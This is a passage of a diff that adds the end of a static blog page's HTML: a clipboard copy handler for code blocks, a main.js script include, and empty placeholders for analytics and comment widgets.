+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
